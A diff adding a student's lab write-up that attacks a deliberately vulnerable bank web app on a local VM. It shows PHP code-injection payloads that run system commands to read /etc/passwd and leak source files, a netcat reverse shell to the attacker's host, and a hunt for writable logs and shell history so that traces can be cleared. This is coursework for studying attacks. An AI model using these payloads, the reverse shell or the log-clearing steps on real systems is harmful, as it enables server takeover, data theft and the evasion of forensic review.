@@ -334,6 +334,248 @@ __Solution :__ `https` has No influence on carrying out the session fixation att
 __5. Accordingly, which countermeasure is necessary to prevent your attacks?
 Patch your system and test it against Session Fixation again.__
 
+<!-- NOTE   finish -->
+__Solution__ session_rengenerate()
+
+
+
+### Exercise 6: Remote Code Injection
+
+__1. Find a section that allows you to inject and execute arbitrary code (PHP). Document your steps and explain why does it allow the execution?__
+__solution :__
+1. Found user input on `htbdetails` > `Account details` page, where arbitary code injection is possible.
+ After analysing the source code:
+```php
+$replaceWith =  "preg_replace('#\b". str_replace('\\',
+                '\\\\', $http['query']) ."\b#i', '<span
+                class=\"queryHighlight\">\\\\0</span>','\\0')";
+```
+preg_replace function is in strings and input is part of the string, terminated using `'` and injected php code and opened `'` for the continueing string
+
+payload:
+```php
+    ' . phpinfo() .'
+```
+> `.` is used to concatenate to the string
+
+that breaks the following query
+```php
+$replaceWith =  "preg_replace('#\b". str_replace('\\',
+                '\\\\', $http['query']) ."\b#i', '<span
+                class=\"queryHighlight\">\\\\0</span>','\\0')";
+```
+into
+
+```php
+preg_replace('#\b'. phpinfo() .'\b#i', '\\0','\0')
+```
+
+__2. Disclose the master password for the database your bank application has access
+to. Indicate username, password and DB name as well as the IP address of the
+machine this database is running on.__
+
+
+__4. Assume you are running a server with virtual hosts. Can you disclose the
+password for another bank database and can you access it? Explain which
+potential risk does this vulnerability imply for virtual hosts?__
+__Solution__
+Yes, as the code injection can lead to server takeover, it is possible to view database and passwords of all the bank acounts running on root host.
+Since the settings(`example.conf`) can be modified(Assuming the taken over account has write permissions).
+
+> usually database is same for all sub-domains in the application, unless the database is different for each virtual host, there are chances that vulnerable vhost has no to minimum impact on accessing other databases.
+
+If one virtual host is exploitable(code injection) that lead to other subdomain take over because of remote code injection vulnerability in one, which is a potential risk in vhosts.
+- Even though attacker may not have access to other subdomains intially, vulnerable subdomain(which attacker has access to) leads to other sub-domain take over.
+
+
+__5. Display /etc/passwd of the web server, the bank application is running on. Try
+different methods to achieve this goal. Explain why some methods cannot be
+successful.__
+__solution__
+
+- payload used:
+    ```php
+        '. system("cat/etc/passwd") .'
+    ```
+- Result:
+
+    ![etc_passwd_displaying](images/task2/etc_passwd.PNG)
+
+- other methods used/tried:(not successful)
+
+```php
+    ' . echo include_once('/etc/passwd') . '
+```
+
+```php
+    ' . show_source("../../../../../../../etc/passwd", true) . '
+```
+
+```php
+    ' .  echo file_get_contents("../../../../../../../etc/passwd"); . '
+```
+
+the above methods are un-successfull as they are executing on server side but not as a response that can be viewed in browser.
+
+
+__6. Show how to “leak” the complete source files of your web application. Briefly describe, how you accomplished this.__
+__solution :__
+- since  command execution on `htbdetails` > `Account details` page is possible, we used system commands to display the source files
+
+- Leaking index page
+    - payload used 
+        ```php
+        '. system("cat index.php") .'
+        ```
+    - Application URL
+        ```javascript
+        http://192.168.37.128/htdocs/index.php?account=173105291&page=
+        htbdetails&query=%27.+system%28%22cat+index.php%22%29+.%27&
+        submit=Submit+Query
+        ```
+    -  **Result**
+
+        ![leak_source_1](images/task2/leak_source_1.PNG)
+        <br></br>
+
+- Leaking login.php page
+    - payload used
+    ```php
+    '. system("cat login.php") .'
+    ```
+    - Application URL 
+        ```javascript
+        http://192.168.37.128/htdocs/index.php?account=173105291page=htbdetails
+        &query=%27.+system%28%22cat+login.php%22%29+.%27&submit=Submit+Query
+        ```
+    - **Result**
+    ![leak_source_2](images/task2/leak_source_2.PNG)
+
+
+__7. Suppose you are an anonymous attacker:
+a) Upload a web shell on the victim server and show that you can take
+control of the server.
+b) Deface the main bank page.
+c) Clear possible traces that could lead to you.__
+__solution :__
+
+**a**). Used `netcat` for creating a reverse connection from victim machine
+- payload used:
+```php
+    '. system("nc -e /bin/sh 192.168.37.128 1234") .'
+```
+
+- On attcker machine (listen on corresponding port - 1234)
+```bash
+    $ sudo nc -lvnp  1234  
+```
+- **Result** (received connection from victim)
+![reverse_shell](images/task2/reverse_shell.PNG)
+
+**b**). look for file permissions of index page (navigate to /var/www/html/htdocs)
+```bash
+$ ls -la
+ls -la
+total 40
+drwSr-sr-x 3 root  root 4096 May 10 07:23 .
+drwxr-xr-x 6 root  root 4096 May 12 10:15 ..
+-rw-rw-rw- 1 mysql root  141 May 10 07:23 file
+-rw-r--r-- 1 root  root 6791 Apr  6  2014 htb.css
+-rw-r--r-- 1 root  root  591 Apr  6  2014 htb.js
+drwxr-xr-x 3 root  root 4096 Mar 20  2014 images
+-rw-r--r-- 1 root  root 7080 May 12 11:06 index.php
+-rw-r--r-- 1 root  root 1997 May 10 05:34 login.php
+
+```
+
+> `index.php` is not writeable- hence defacing the obrtained account is not possible
+
+
+**c**). Escaping tty shell for better readability in terminal
+- payload used:
+    ```bash
+    python -c 'import pty; pty.spawn("/bin/sh")'
+    ```
+- locating bash_history
+    ```bash
+    $ locate bash_history
+    locate bash_history
+    /home/kali/.bash_history
+    $ cd /home/kali/
+    ```
+- look for permissions
+    ```bash
+    $ ls -la | grep bash
+
+    -rw-r--r--  1 kali kali      1 Mar  3 16:41 .bash_history
+    -rw-r--r--  1 kali kali    220 Feb 23 05:36 .bash_logout
+    -rw-r--r--  1 kali kali   4705 Feb 23 05:36 .bashrc
+    -rw-r--r--  1 kali kali   3526 Feb 23 05:36 .bashrc.original
+    ```
+    > Since .bash_history is not writable, deleting is not possible
+
+- locating other log files
+    ```bash
+    $ locate log | grep apache
+        /etc/apache2/conf-available/other-vhosts-access-log.conf
+        /etc/apache2/conf-enabled/other-vhosts-access-log.conf
+        /etc/apache2/mods-available/log_debug.load
+        /etc/apache2/mods-available/log_forensic.load
+        /etc/logrotate.d/apache2
+        /usr/lib/apache2/modules/mod_log_debug.so
+        /usr/lib/apache2/modules/mod_log_forensic.so
+        /usr/share/apache2/icons/openlogo-75.png
+        /usr/share/doc/apache2/changelog.Debian.gz
+        /usr/share/doc/apache2/changelog.gz
+        /usr/share/doc/apache2-bin/changelog.Debian.gz
+        /usr/share/doc/apache2-bin/changelog.gz
+        /usr/share/doc/apache2-data/changelog.Debian.gz
+        /usr/share/doc/apache2-utils/changelog.Debian.gz
+        /usr/share/doc/apache2-utils/changelog.gz
+        /usr/share/doc/libapache-pom-java/changelog.Debian.gz
+        /var/lib/apache2/conf/enabled_by_maint/other-vhosts-access-log
+        /var/log/apache2
+
+    ```
+- navigate to /var/log/
+    ```bash
+    $ cd /var/log
+    ```
+- look for file permissions
+    ```bash
+    ls -la
+    total 5500
+    drwxr-xr-x  19 root     root               4096 May 22 04:44 .
+    drwxr-xr-x  12 root     root               4096 Apr 16 16:32 ..
+    -rw-r--r--   1 root     root              25060 May 22 08:54 Xorg.0.log
+    -rw-r--r--   1 root     root              54260 May 19 04:44 Xorg.0.log.old
+    -rw-r--r--   1 root     root              24191 May 15 06:21 Xorg.1.log
+    -rw-r--r--   1 root     root              24195 May 15 05:31 Xorg.1.log.old
+    -rw-r--r--   1 root     root                516 May  4 10:15 alternatives.log
+    -rw-r--r--   1 root     root               1680 Apr 28 06:12 alternatives.log.1
+    -rw-r--r--   1 root     root               6567 Mar  9 10:10 alternatives.log.2.gz
+    drwxr-x---   2 root     adm                4096 May 19 04:04 apache2
+    drwxr-xr-x   2 root     root               4096 May 15 19:06 apt
+    -rw-r-----   1 root     adm               67039 May 22 08:55 auth.log
+    -rw-r-----   1 root     adm              316551 May 16 04:35 auth.log.1
+    -rw-r-----   1 root     adm               11047 May  8 15:39 auth.log.2.gz
+    -rw-r-----   1 root     adm               10748 May  1 18:55 auth.log.3.gz
+    -rw-r-----   1 root     adm                5532 Apr 25 04:22 auth.log.4.gz
+    -rw-------   1 root     root               5501 May 19 04:45 boot.log
+    -rw-------   1 root     root               5501 May 14 02:51 boot.log.1
+    -rw-------   1 root     root               5501 Apr 30 07:39 boot.log.2
+    -rw-------   1 root     root               6759 Apr 25 04:22 boot.log.3
+    -rw-------   1 root     root               5451 Apr 19 00:49 boot.log.4
+    -rw-------   1 root     root              66466 Apr  2 05:52 boot.log.5
+    ```
+    > ALl the files found are not writeable by service account `www` which we exploited.
+
+
+<br></br><br></br>
+<br></br>
+<br></br>
+<br></br>
+<br></br>
 1. initiate transfer
 1a clear current cookie set expires (document.cookie = "USECURITYID=abcde; expires= Thu, 21 Aug 2014 20:00:00 UTC;"
 )
